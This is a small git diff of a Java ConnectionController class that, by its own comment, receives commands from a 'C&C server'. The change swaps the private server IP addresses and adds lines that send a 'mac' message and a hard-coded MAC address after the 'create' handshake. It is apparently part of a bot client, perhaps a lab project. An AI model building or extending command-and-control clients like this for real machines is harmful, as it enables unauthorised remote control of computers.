@@ -27,14 +27,14 @@ public class ConnectionController {
 	StreamParser parser = new StreamParser();
 	
 	public ConnectionController() throws Exception{
-		SERVER_IP = InetAddress.getByName("10.16.167.8");	
+		SERVER_IP = InetAddress.getByName("10.16.169.191");	
 		System.out.println("Connectionscontroller constructor init'd");
 	}
 	
 	public BufferedReader connectToServer(){
 		// from here we get the command from the C&C server
 		try {
-			SERVER_IP = InetAddress.getByName("10.16.99.177");
+			SERVER_IP = InetAddress.getByName("10.16.169.191");
 		} catch (UnknownHostException e1) {
 			System.out.println("Could not resolve server ip to InetAddress");
 			e1.printStackTrace();
@@ -44,6 +44,10 @@ public class ConnectionController {
 		
 		System.out.println("tcp initialized, now sending create"); // useless shit protocol HAVE TO BE MITIGATED!!! 
 		con.sendTCP("create\n");
+		
+		con.sendTCP("mac\n");
+		con.sendTCP("60:c5:47:0a:05:fe");
+		
 		try {
 			Thread.sleep(500);
 		} catch (InterruptedException e) {
